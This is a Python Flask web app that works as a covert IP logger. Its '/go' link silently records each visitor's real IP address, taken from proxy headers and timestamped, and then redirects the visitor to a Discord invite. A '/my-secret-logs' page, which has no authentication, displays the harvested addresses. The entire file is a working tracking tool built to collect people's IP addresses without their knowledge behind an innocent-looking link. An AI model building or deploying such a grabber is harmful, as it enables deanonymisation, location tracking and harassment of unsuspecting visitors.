from flask import Flask, request, redirect
from datetime import datetime, timedelta
import os

app = Flask(__name__)

# Function to write to the log file
def log_ip(ip):
    # Render servers use UTC. Adding 8 hours converts it to Philippine Time.
    ph_time = datetime.utcnow() + timedelta(hours=8)
    # Format the time for easier reading (12-hour format with AM/PM)
    timestamp = ph_time.strftime('%Y-%m-%d %I:%M:%S %p')
    
    # Note: 'ips.txt' is deleted every time Render restarts or redeploys
    with open("ips.txt", "a") as f:
        f.write(f"{timestamp} - {ip}\n")

@app.route('/')
def home():
    return "Server is running!"

@app.route('/go')
def track():
    # 1. Capture every possible header Render might use
    headers = {
        'X-Forwarded-For': request.headers.get('X-Forwarded-For'),
        'X-Real-IP': request.headers.get('X-Real-IP'),
        'Remote-Addr': request.remote_addr,
        'CF-Connecting-IP': request.headers.get('CF-Connecting-IP') # Some proxies use this
    }
    
    # 2. Try to find the first non-Render IP
    final_ip = "Unknown"
    for name, value in headers.items():
        if value:
            first_ip = value.split(',')[0].strip()
            if not first_ip.startswith('209.35') and not first_ip.startswith('10.'):
                final_ip = first_ip
                break
    
    # 3. If we still fail, log ALL headers so we can see the "map"
    if final_ip == "Unknown":
        final_ip = f"DEBUG: {headers}"

    log_ip(final_ip)
    return redirect("https://discord.gg/TMKATk684K")

# Secret route to view your logs in the browser
@app.route('/my-secret-logs')
def show_logs():
    if os.path.exists("ips.txt"):
        with open("ips.txt", "r") as f:
            # Using <pre> keeps the formatting clean in the browser
            return f"<pre>{f.read()}</pre>"
    return "No logs captured yet!"

if __name__ == '__main__':
    # Dynamic port binding for Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)